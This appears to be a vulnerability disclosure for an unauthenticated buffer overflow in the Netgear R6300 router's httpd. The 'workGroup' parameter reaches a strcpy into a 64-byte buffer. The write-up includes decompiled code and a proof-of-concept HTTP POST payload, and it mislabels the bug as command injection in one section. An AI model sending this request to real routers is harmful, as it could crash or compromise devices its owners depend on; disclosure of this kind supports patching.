# Buffer Overflow Vulnerability in `smb_group_name`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6300 Router                                         |
| Firmware Version     | V1.0.2.80_1.0.59                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`USBAdvCgiMain` → `acosNvramConfig_set` → `samba_writeSmbConf`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `workGroup` |

2. Exploitation Path

```c
// httpd
int __fastcall USBAdvCgiMain(int a1, int a2)
{
  ...
  char v70[256]; // [sp+E4h] [-20Ch] BYREF
  ...
  websGetVar(a1, "workGroup", v70);
  acosNvramConfig_set("smb_group_name", v70);
  ...
}

int samba_writeSmbConf()
{
  FILE *v0; // $v0
  FILE *v1; // $s2
  const char *v3; // $v0
  ...
  char v21[64]; // [sp+10h] [-10518h] BYREF
  ...

  memset(v21, 0, sizeof(v21));
  ...
  v3 = (const char *)acosNvramConfig_get("smb_group_name");
  strcpy(v21, v3);
  ...
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: In the `httpd` binary, the `USBAdvCgiMain` function at line 7 invokes `websGetVar(a1, "workGroup", v70)` to receive input. Although a 255-byte length limit is enforced, no additional validation is applied. The input is then stored via `acosNvramConfig_set("smb_group_name", v70)` at line 8. Subsequently, the `samba_writeSmbConf` function retrieves this value at line 23 using `v3 = (const char *)acosNvramConfig_get("smb_group_name")`, and copies it into the destination buffer `v21` via `strcpy(v21, v3)` at line 24. Since the buffer `v21` has a size of only 64 bytes, this leads to a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/USBAdvCgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

workGroup=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```